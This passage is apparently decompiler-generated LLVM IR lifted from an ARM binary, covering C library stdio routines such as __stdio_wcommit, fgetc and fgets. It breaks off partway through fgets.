  store i32 %v2_16864, i32* %r0.global-to-local, align 4
  %v3_16864 = add i32 %v0_16864, 4
  %v4_16864 = inttoptr i32 %v3_16864 to i32*
  %v5_16864 = load i32, i32* %v4_16864, align 4
  store i32 %v5_16864, i32* %r1.global-to-local, align 4
  %v6_16864 = add i32 %v0_16864, 8
  %v7_16864 = inttoptr i32 %v6_16864 to i32*
  %v8_16864 = load i32, i32* %v7_16864, align 4
  store i32 %v8_16864, i32* %r2.global-to-local, align 4
  %v1_1686c = load i32, i32* %r5.global-to-local, align 4
  %v2_1686c = add i32 %v1_1686c, 52
  %v3_1686c = inttoptr i32 %v2_1686c to i32*
  store i32 1, i32* %v3_1686c, align 4
  %v0_16870 = load i32, i32* %r5.global-to-local, align 4
  %v1_16870 = add i32 %v0_16870, 56
  store i32 %v1_16870, i32* %r3.global-to-local, align 4
  %v2_16874 = load i32, i32* %r0.global-to-local, align 4
  %v1_16878 = inttoptr i32 %v1_16870 to i32*
  store i32 %v2_16874, i32* %v1_16878, align 4
  %v3_16878 = add i32 %v0_16870, 60
  %v4_16878 = inttoptr i32 %v3_16878 to i32*
  %v5_16878 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16878, i32* %v4_16878, align 4
  %v6_16878 = add i32 %v0_16870, 64
  %v7_16878 = inttoptr i32 %v6_16878 to i32*
  %v8_16878 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_16878, i32* %v7_16878, align 4
  %v0_1687c = load i32, i32* %r5.global-to-local, align 4
  %v1_1687c = add i32 %v0_1687c, 32
  %v2_1687c = inttoptr i32 %v1_1687c to i32*
  %v3_1687c = load i32, i32* %v2_1687c, align 4
  store i32 %v3_1687c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16880 = icmp eq i32 %v3_1687c, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_16888 = add i32 %v3_1687c, 56
  store i32 %v1_16888, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_16880, label %dec_label_pc_16894, label %dec_label_pc_167f8

dec_label_pc_16894:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_16898 = load i32, i32* %r7.global-to-local, align 4
  %v2_16898 = add i32 %v0_16898, 76
  %v3_16898 = inttoptr i32 %v2_16898 to i32*
  %v4_16898 = load i32, i32* %v3_16898, align 4
  store i32 %v4_16898, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_16898 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168b814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_168b814, label %dec_label_pc_168c0, label %dec_label_pc_168a4

dec_label_pc_168a4:                               ; preds = %dec_label_pc_16894, %dec_label_pc_168b8
  %v1_168ac = phi i32 [ %storemerge, %dec_label_pc_168b8 ], [ %storemerge12, %dec_label_pc_16894 ]
  %v1_168a4 = inttoptr i32 %v1_168ac to i16*
  %v2_168a4 = load i16, i16* %v1_168a4, align 2
  %v3_168a4 = zext i16 %v2_168a4 to i32
  store i32 %v3_168a4, i32* %r3.global-to-local, align 4
  %v1_168a8 = and i32 %v3_168a4, 64
  %v2_168a8 = icmp eq i32 %v1_168a8, 0
  br i1 %v2_168a8, label %dec_label_pc_168b8, label %bb39

bb39:                                             ; preds = %dec_label_pc_168a4
  store i32 %v1_168ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_168b8

dec_label_pc_168b8:                               ; preds = %dec_label_pc_168a4, %bb39
  %v1_168b0 = xor i1 %v2_168a8, true
  call void @__pseudo_cond_branch(i1 %v1_168b0, i32 ptrtoint (i32* @global_var_168e8.647 to i32))
  %v0_168b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_168b4 = add i32 %v0_168b4, 32
  %storemerge.in = inttoptr i32 %v1_168b4 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168b8 = icmp eq i32 %storemerge, 0
  br i1 %v2_168b8, label %dec_label_pc_168c0, label %dec_label_pc_168a4

dec_label_pc_168c0:                               ; preds = %dec_label_pc_168b8, %dec_label_pc_16894
  %v2_168c4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_168c4, i32* %r4.global-to-local, align 4
  %v1_168c8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_168c8

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_1687c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1681c, { 1, 0 }
  uselistorder i32 %v4_167dc, { 2, 1, 0 }
  uselistorder i32 %v4_167ac, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 2, 7, 6, 0, 5, 3, 4, 1 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 2, 3, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 0, 7, 3, 4, 5, 6, 1 }
  uselistorder label %dec_label_pc_168b8, { 1, 0 }
  uselistorder label %dec_label_pc_168a4, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1683c, { 1, 0 }
  uselistorder label %dec_label_pc_16818, { 1, 0 }
  uselistorder label %dec_label_pc_167f8, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_168e8 = load i32, i32* @r4, align 4
  store i32 %v3_168e8, i32* %stack_var_-8, align 4
  %v1_168ec = add i32 %arg1, 8
  %v2_168ec = inttoptr i32 %v1_168ec to i32*
  %v3_168ec = load i32, i32* %v2_168ec, align 4
  store i32 %v3_168ec, i32* @r1, align 4
  %v1_168f0 = add i32 %arg1, 16
  %v2_168f0 = inttoptr i32 %v1_168f0 to i32*
  %v3_168f0 = load i32, i32* %v2_168f0, align 4
  %v9_168f4 = icmp eq i32 %v3_168f0, %v3_168ec
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_168f4, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_168ec, i32* %v2_168f0, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_16900 = xor i1 %v9_168f4, true
  call void @__pseudo_cond_branch(i1 %v1_16900, i32 ptrtoint (i32* @global_var_182d8.648 to i32))
  %v0_16904 = load i32, i32* %r4.global-to-local, align 4
  %v1_16904 = add i32 %v0_16904, 8
  %v2_16904 = inttoptr i32 %v1_16904 to i32*
  %v3_16904 = load i32, i32* %v2_16904, align 4
  %v1_16908 = add i32 %v0_16904, 16
  %v2_16908 = inttoptr i32 %v1_16908 to i32*
  %v3_16908 = load i32, i32* %v2_16908, align 4
  %v2_1690c = sub i32 %v3_16908, %v3_16904
  %v2_16910 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16910, i32* @r4, align 4
  ret i32 %v2_1690c

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16918 = load i32, i32* @r4, align 4
  store i32 %v3_16918, i32* %stack_var_-20, align 4
  %v6_16918 = load i32, i32* @r5, align 4
  %v9_16918 = load i32, i32* @r6, align 4
  %v12_16918 = load i32, i32* @r7, align 4
  %v15_16918 = load i32, i32* @lr, align 4
  %v1_1691c = add i32 %arg1, 52
  %v2_1691c = inttoptr i32 %v1_1691c to i32*
  %v3_1691c = load i32, i32* %v2_1691c, align 4
  store i32 %v3_1691c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16920 = icmp eq i32 %v3_1691c, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_16920, label %dec_label_pc_16954, label %dec_label_pc_16930

dec_label_pc_16930:                               ; preds = %entry
  %v1_16930 = add i32 %arg1, 16
  %v2_16930 = inttoptr i32 %v1_16930 to i32*
  %v3_16930 = load i32, i32* %v2_16930, align 4
  store i32 %v3_16930, i32* %r2.global-to-local, align 4
  %v1_16934 = add i32 %arg1, 24
  %v2_16934 = inttoptr i32 %v1_16934 to i32*
  %v3_16934 = load i32, i32* %v2_16934, align 4
  store i32 %v3_16934, i32* %r3.global-to-local, align 4
  %v3_16938 = icmp uge i32 %v3_16930, %v3_16934
  store i1 %v3_16938, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_16938, label %dec_label_pc_16948, label %.thread

.thread:                                          ; preds = %dec_label_pc_16930
  %v2_1693c = inttoptr i32 %v3_16930 to i8*
  %v3_1693c = load i8, i8* %v2_1693c, align 1
  %v4_1693c = zext i8 %v3_1693c to i32
  store i32 %v4_1693c, i32* %r5.global-to-local, align 4
  %v6_1693c = add i32 %v3_16930, 1
  store i32 %v6_1693c, i32* %r2.global-to-local, align 4
  store i32 %v6_1693c, i32* %v2_16930, align 4
  br label %dec_label_pc_16a4c

dec_label_pc_16948:                               ; preds = %dec_label_pc_16930
  %v1_16948 = inttoptr i32 %arg1 to i16*
  %v2_16948 = call i32 @getc_unlocked(i16* %v1_16948)
  store i32 %v2_16948, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16a4c

dec_label_pc_16954:                               ; preds = %entry
  %v0_16954 = call i32 @__aeabi_read_tp()
  %v0_16958 = load i32, i32* @r7, align 4
  %v1_16958 = add i32 %v0_16958, 64
  %v2_16958 = inttoptr i32 %v1_16958 to i32*
  %v3_16958 = load i32, i32* %v2_16958, align 4
  store i32 %v3_16958, i32* %r3.global-to-local, align 4
  %v1_1695c = add i32 %v0_16954, -1168
  store i32 %v1_1695c, i32* @r6, align 4
  %v3_16960 = icmp uge i32 %v3_16958, %v1_1695c
  store i1 %v3_16960, i1* %cpsr_c.global-to-local, align 1
  %v9_16960 = icmp eq i32 %v3_16958, %v1_1695c
  br i1 %v9_16960, label %dec_label_pc_169a8, label %dec_label_pc_16968

dec_label_pc_16968:                               ; preds = %dec_label_pc_16954
  %v1_16968 = add i32 %v0_16958, 56
  store i32 %v1_16968, i32* @r5, align 4
  store i32 %v1_16968, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16974

dec_label_pc_16974:                               ; preds = %dec_label_pc_16980.dec_label_pc_16974_crit_edge, %dec_label_pc_16968
  %v0_16974 = phi i32 [ %v0_16974.pre, %dec_label_pc_16980.dec_label_pc_16974_crit_edge ], [ %v1_16968, %dec_label_pc_16968 ]
  %v1_16974 = inttoptr i32 %v0_16974 to i32*
  %v2_16974 = load i32, i32* %v1_16974, align 4
  store i32 %v2_16974, i32* %r3.global-to-local, align 4
  %v1_16978 = load i32, i32* @r4, align 4
  %v3_16978 = icmp uge i32 %v2_16974, %v1_16978
  store i1 %v3_16978, i1* %cpsr_c.global-to-local, align 1
  %v9_16978 = icmp eq i32 %v2_16974, %v1_16978
  br i1 %v9_16978, label %dec_label_pc_16980, label %dec_label_pc_16998

dec_label_pc_16980:                               ; preds = %dec_label_pc_16974
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16990 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16990, label %dec_label_pc_16994, label %dec_label_pc_16980.dec_label_pc_16974_crit_edge

dec_label_pc_16980.dec_label_pc_16974_crit_edge:  ; preds = %dec_label_pc_16980
  %v0_16974.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16974

dec_label_pc_16994:                               ; preds = %dec_label_pc_16980
  %v0_16994 = load i32, i32* @r4, align 4
  store i32 %v0_16994, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16998

dec_label_pc_16998:                               ; preds = %dec_label_pc_16974, %dec_label_pc_16994
  %v0_16998 = phi i32 [ %v0_16994, %dec_label_pc_16994 ], [ %v2_16974, %dec_label_pc_16974 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16998 = icmp eq i32 %v0_16998, 0
  br i1 %v2_16998, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_16998
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_16998, %bb
  store i32 92580, i32* @lr, align 4
  %v1_169a0 = xor i1 %v2_16998, true
  call void @__pseudo_cond_branch(i1 %v1_169a0, i32 ptrtoint (i32* @global_var_14784.527 to i32))
  %v0_169a4 = load i32, i32* @r6, align 4
  %v1_169a4 = load i32, i32* @r7, align 4
  %v2_169a4 = add i32 %v1_169a4, 64
  %v3_169a4 = inttoptr i32 %v2_169a4 to i32*
  store i32 %v0_169a4, i32* %v3_169a4, align 4
  %v0_169a8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_169a8

dec_label_pc_169a8:                               ; preds = %dec_label_pc_16954, %bb18
  %v1_169b8 = phi i32 [ %v0_16958, %dec_label_pc_16954 ], [ %v0_169a8.pre, %bb18 ]
  %v1_169a8 = add i32 %v1_169b8, 60
  %v2_169a8 = inttoptr i32 %v1_169a8 to i32*
  %v3_169a8 = load i32, i32* %v2_169a8, align 4
  store i32 %v3_169a8, i32* %r2.global-to-local, align 4
  %v1_169ac = add i32 %v1_169b8, 16
  %v2_169ac = inttoptr i32 %v1_169ac to i32*
  %v3_169ac = load i32, i32* %v2_169ac, align 4
  store i32 %v3_169ac, i32* @r1, align 4
  %v1_169b0 = add i32 %v1_169b8, 24
  %v2_169b0 = inttoptr i32 %v1_169b0 to i32*
  %v3_169b0 = load i32, i32* %v2_169b0, align 4
  store i32 %v3_169b0, i32* %r3.global-to-local, align 4
  %v1_169b4 = add i32 %v3_169a8, 1
  store i32 %v1_169b4, i32* %r2.global-to-local, align 4
  store i32 %v1_169b4, i32* %v2_169a8, align 4
  %v0_169bc = load i32, i32* @r1, align 4
  %v1_169bc = load i32, i32* %r3.global-to-local, align 4
  %v3_169bc = icmp uge i32 %v0_169bc, %v1_169bc
  store i1 %v3_169bc, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_169bc, label %dec_label_pc_169cc, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_169a8
  %v2_169c0 = inttoptr i32 %v0_169bc to i8*
  %v3_169c0 = load i8, i8* %v2_169c0, align 1
  %v4_169c0 = zext i8 %v3_169c0 to i32
  store i32 %v4_169c0, i32* %r5.global-to-local, align 4
  %v6_169c0 = add i32 %v0_169bc, 1
  store i32 %v6_169c0, i32* @r1, align 4
  %v2_169c4 = load i32, i32* @r7, align 4
  %v3_169c4 = add i32 %v2_169c4, 16
  %v4_169c4 = inttoptr i32 %v3_169c4 to i32*
  store i32 %v6_169c0, i32* %v4_169c4, align 4
  br label %dec_label_pc_169d8

dec_label_pc_169cc:                               ; preds = %dec_label_pc_169a8
  %v0_169cc = load i32, i32* @r7, align 4
  %v1_169d0 = inttoptr i32 %v0_169cc to i16*
  %v2_169d0 = call i32 @getc_unlocked(i16* %v1_169d0)
  store i32 %v2_169d0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_169d8

dec_label_pc_169d8:                               ; preds = %.thread2, %dec_label_pc_169cc
  %v0_169d8 = load i32, i32* @r7, align 4
  %v1_169d8 = add i32 %v0_169d8, 60
  %v2_169d8 = inttoptr i32 %v1_169d8 to i32*
  %v3_169d8 = load i32, i32* %v2_169d8, align 4
  %v1_169dc = add i32 %v3_169d8, -1
  store i32 %v1_169dc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_169e0 = icmp eq i32 %v1_169dc, 0
  store i32 %v1_169dc, i32* %v2_169d8, align 4
  br i1 %v2_169e0, label %dec_label_pc_169ec, label %dec_label_pc_16a4c

dec_label_pc_169ec:                               ; preds = %dec_label_pc_169d8
  %v0_169ec = load i32, i32* %r3.global-to-local, align 4
  %v1_169ec = load i32, i32* @r7, align 4
  %v2_169ec = add i32 %v1_169ec, 64
  %v3_169ec = inttoptr i32 %v2_169ec to i32*
  store i32 %v0_169ec, i32* %v3_169ec, align 4
  %v0_169f0 = load i32, i32* @r7, align 4
  %v1_169f0 = add i32 %v0_169f0, 56
  store i32 %v1_169f0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_169f4

dec_label_pc_169f4:                               ; preds = %dec_label_pc_16a24.dec_label_pc_169f4_crit_edge, %dec_label_pc_169ec
  %v0_169fc = phi i32 [ %v0_169fc.pre, %dec_label_pc_16a24.dec_label_pc_169f4_crit_edge ], [ %v1_169f0, %dec_label_pc_169ec ]
  %v0_169f4 = phi i32 [ %v0_169f4.pre, %dec_label_pc_16a24.dec_label_pc_169f4_crit_edge ], [ %v0_169f0, %dec_label_pc_169ec ]
  %v1_169f4 = add i32 %v0_169f4, 56
  %v2_169f4 = inttoptr i32 %v1_169f4 to i32*
  %v3_169f4 = load i32, i32* %v2_169f4, align 4
  store i32 %v3_169f4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_169fc, i32* %r2.global-to-local, align 4
  %v1_16a0022 = inttoptr i32 %v0_169fc to i32*
  %v2_16a0023 = load i32, i32* %v1_16a0022, align 4
  store i32 %v2_16a0023, i32* %r3.global-to-local, align 4
  %v3_16a0425 = icmp uge i32 %v2_16a0023, %v3_169f4
  store i1 %v3_16a0425, i1* %cpsr_c.global-to-local, align 1
  %v9_16a0431 = icmp eq i32 %v2_16a0023, %v3_169f4
  br i1 %v9_16a0431, label %dec_label_pc_16a0c, label %dec_label_pc_16a24

dec_label_pc_16a0c:                               ; preds = %dec_label_pc_169f4, %dec_label_pc_16a0c.dec_label_pc_16a00_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16a1c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16a1c, label %dec_label_pc_16a20, label %dec_label_pc_16a0c.dec_label_pc_16a00_crit_edge

dec_label_pc_16a0c.dec_label_pc_16a00_crit_edge:  ; preds = %dec_label_pc_16a0c
  %v0_16a00.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16a04.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16a00 = inttoptr i32 %v0_16a00.pre to i32*
  %v2_16a00 = load i32, i32* %v1_16a00, align 4
  store i32 %v2_16a00, i32* %r3.global-to-local, align 4
  %v3_16a04 = icmp uge i32 %v2_16a00, %v1_16a04.pre
  store i1 %v3_16a04, i1* %cpsr_c.global-to-local, align 1
  %v9_16a04 = icmp eq i32 %v2_16a00, %v1_16a04.pre
  br i1 %v9_16a04, label %dec_label_pc_16a0c, label %dec_label_pc_16a24

dec_label_pc_16a20:                               ; preds = %dec_label_pc_16a0c
  %v0_16a20 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16a20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16a24

dec_label_pc_16a24:                               ; preds = %dec_label_pc_169f4, %dec_label_pc_16a0c.dec_label_pc_16a00_crit_edge, %dec_label_pc_16a20
  %v0_16a2c = phi i32 [ %v0_16a20, %dec_label_pc_16a20 ], [ %v2_16a0023, %dec_label_pc_169f4 ], [ %v2_16a00, %dec_label_pc_16a0c.dec_label_pc_16a00_crit_edge ]
  %v1_16a24 = phi i32 [ %v0_16a20, %dec_label_pc_16a20 ], [ %v3_169f4, %dec_label_pc_169f4 ], [ %v1_16a04.pre, %dec_label_pc_16a0c.dec_label_pc_16a00_crit_edge ]
  %v3_16a24 = icmp uge i32 %v0_16a2c, %v1_16a24
  store i1 %v3_16a24, i1* %cpsr_c.global-to-local, align 1
  %v9_16a24 = icmp eq i32 %v0_16a2c, %v1_16a24
  br i1 %v9_16a24, label %dec_label_pc_16a2c, label %dec_label_pc_16a24.dec_label_pc_169f4_crit_edge

dec_label_pc_16a24.dec_label_pc_169f4_crit_edge:  ; preds = %dec_label_pc_16a24
  %v0_169f4.pre = load i32, i32* @r7, align 4
  %v0_169fc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_169f4

dec_label_pc_16a2c:                               ; preds = %dec_label_pc_16a24
  %v2_16a2c = icmp ne i32 %v1_16a24, 0
  store i1 %v2_16a2c, i1* %cpsr_c.global-to-local, align 1
  %v7_16a30 = icmp slt i32 %v1_16a24, 2
  br i1 %v7_16a30, label %dec_label_pc_16a4c, label %dec_label_pc_16a34

dec_label_pc_16a34:                               ; preds = %dec_label_pc_16a2c
  %v0_16a38 = load i32, i32* @r1, align 4
  %v1_16a38 = add i32 %v0_16a38, 129
  store i32 %v1_16a38, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16a4c

dec_label_pc_16a4c:                               ; preds = %.thread, %dec_label_pc_169d8, %dec_label_pc_16a34, %dec_label_pc_16a2c, %dec_label_pc_16948
  %v0_16a4c = load i32, i32* %r5.global-to-local, align 4
  %v2_16a54 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16a54, i32* @r4, align 4
  store i32 %v6_16918, i32* @r5, align 4
  store i32 %v9_16918, i32* @r6, align 4
  store i32 %v12_16918, i32* @r7, align 4
  store i32 %v15_16918, i32* @lr, align 4
  ret i32 %v0_16a4c

; uselistorder directives
  uselistorder i32 %v0_16a20, { 1, 0, 2 }
  uselistorder i32 %v1_16a04.pre, { 0, 2, 1 }
  uselistorder i32 %v0_169bc, { 1, 0, 2 }
  uselistorder i32 %v1_169b8, { 0, 2, 1 }
  uselistorder i32 %v1_16978, { 1, 0 }
  uselistorder i32 %v3_16930, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_16a4c, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_16a24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16a0c, { 1, 0 }
  uselistorder label %dec_label_pc_169d8, { 1, 0 }
  uselistorder label %dec_label_pc_169a8, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_16998, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16a5c = load i32, i32* @r4, align 4
  store i32 %v3_16a5c, i32* %stack_var_-32, align 4
  %v6_16a5c = load i32, i32* @r5, align 4
  %v9_16a5c = load i32, i32* @r6, align 4
  %v12_16a5c = load i32, i32* @r7, align 4
  %v15_16a5c = load i32, i32* @r8, align 4
  %v24_16a5c = load i32, i32* @lr, align 4
  %v1_16a60 = add i32 %arg3, 52
  %v2_16a60 = inttoptr i32 %v1_16a60 to i32*
  %v3_16a60 = load i32, i32* %v2_16a60, align 4
  store i32 %v3_16a60, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a64 = icmp eq i32 %v3_16a60, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_16a64, label %dec_label_pc_16a78, label %dec_label_pc_16adc

dec_label_pc_16a78:                               ; preds = %entry
  %v0_16a78 = call i32 @__aeabi_read_tp()
  %v1_16a7c = add i32 %arg3, 64
  %v2_16a7c = inttoptr i32 %v1_16a7c to i32*
  %v3_16a7c = load i32, i32* %v2_16a7c, align 4
  store i32 %v3_16a7c, i32* %r3.global-to-local, align 4
  %v1_16a80 = add i32 %v0_16a78, -1168
  store i32 %v1_16a80, i32* @r8, align 4
  %v3_16a84 = icmp uge i32 %v3_16a7c, %v1_16a80
  store i1 %v3_16a84, i1* %cpsr_c.global-to-local, align 1
  %v9_16a84 = icmp eq i32 %v3_16a7c, %v1_16a80
  br i1 %v9_16a84, label %dec_label_pc_16ad0, label %dec_label_pc_16a8c

dec_label_pc_16a8c:                               ; preds = %dec_label_pc_16a78
  %v1_16a8c = add i32 %arg3, 56
  store i32 %v1_16a8c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_16a8c, i32* %r2.global-to-local, align 4
  %v0_16a98 = load i32, i32* @r6, align 4
  store i32 %v0_16a98, i32* @r4, align 4
  %v1_16a9c36 = inttoptr i32 %v1_16a8c to i32*
  %v2_16a9c37 = load i32, i32* %v1_16a9c36, align 4
  store i32 %v2_16a9c37, i32* %r3.global-to-local, align 4
  %v3_16aa039 = icmp uge i32 %v2_16a9c37, %v0_16a98
  store i1 %v3_16aa039, i1* %cpsr_c.global-to-local, align 1
  %v9_16aa045 = icmp eq i32 %v2_16a9c37, %v0_16a98
  br i1 %v9_16aa045, label %dec_label_pc_16aa8, label %dec_label_pc_16ac0

dec_label_pc_16aa8:                               ; preds = %dec_label_pc_16a8c, %dec_label_pc_16aa8.dec_label_pc_16a9c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16ab8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16ab8, label %dec_label_pc_16abc, label %dec_label_pc_16aa8.dec_label_pc_16a9c_crit_edge

dec_label_pc_16aa8.dec_label_pc_16a9c_crit_edge:  ; preds = %dec_label_pc_16aa8
  %v0_16a9c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16aa0.pre = load i32, i32* @r4, align 4
  %v1_16a9c = inttoptr i32 %v0_16a9c.pre to i32*
  %v2_16a9c = load i32, i32* %v1_16a9c, align 4
  store i32 %v2_16a9c, i32* %r3.global-to-local, align 4
  %v3_16aa0 = icmp uge i32 %v2_16a9c, %v1_16aa0.pre
  store i1 %v3_16aa0, i1* %cpsr_c.global-to-local, align 1
  %v9_16aa0 = icmp eq i32 %v2_16a9c, %v1_16aa0.pre
  br i1 %v9_16aa0, label %dec_label_pc_16aa8, label %dec_label_pc_16ac0

dec_label_pc_16abc:                               ; preds = %dec_label_pc_16aa8
  %v0_16abc = load i32, i32* @r4, align 4
  store i32 %v0_16abc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ac0

dec_label_pc_16ac0:                               ; preds = %dec_label_pc_16a8c, %dec_label_pc_16aa8.dec_label_pc_16a9c_crit_edge, %dec_label_pc_16abc
  %v0_16ac0 = phi i32 [ %v0_16abc, %dec_label_pc_16abc ], [ %v2_16a9c37, %dec_label_pc_16a8c ], [ %v2_16a9c, %dec_label_pc_16aa8.dec_label_pc_16a9c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ac0 = icmp eq i32 %v0_16ac0, 0
  br i1 %v2_16ac0, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_16ac0
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_16ac0, %bb
  store i32 92876, i32* @lr, align 4
  %v1_16ac8 = xor i1 %v2_16ac0, true
  call void @__pseudo_cond_branch(i1 %v1_16ac8, i32 ptrtoint (i32* @global_var_14784.527 to i32))
  %v0_16acc = load i32, i32* @r8, align 4
  %v1_16acc = load i32, i32* @r7, align 4
  %v2_16acc = add i32 %v1_16acc, 64
  %v3_16acc = inttoptr i32 %v2_16acc to i32*
  store i32 %v0_16acc, i32* %v3_16acc, align 4
  br label %dec_label_pc_16ad0

dec_label_pc_16ad0:                               ; preds = %dec_label_pc_16a78, %bb20
  %v0_16ad0 = load i32, i32* @r7, align 4
  %v1_16ad0 = add i32 %v0_16ad0, 60
  %v2_16ad0 = inttoptr i32 %v1_16ad0 to i32*
  %v3_16ad0 = load i32, i32* %v2_16ad0, align 4
  %v1_16ad4 = add i32 %v3_16ad0, 1
  store i32 %v1_16ad4, i32* %r3.global-to-local, align 4
  store i32 %v1_16ad4, i32* %v2_16ad0, align 4
  %v0_16adc.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_16ae0.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_16ae4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16adc

dec_label_pc_16adc:                               ; preds = %entry, %dec_label_pc_16ad0
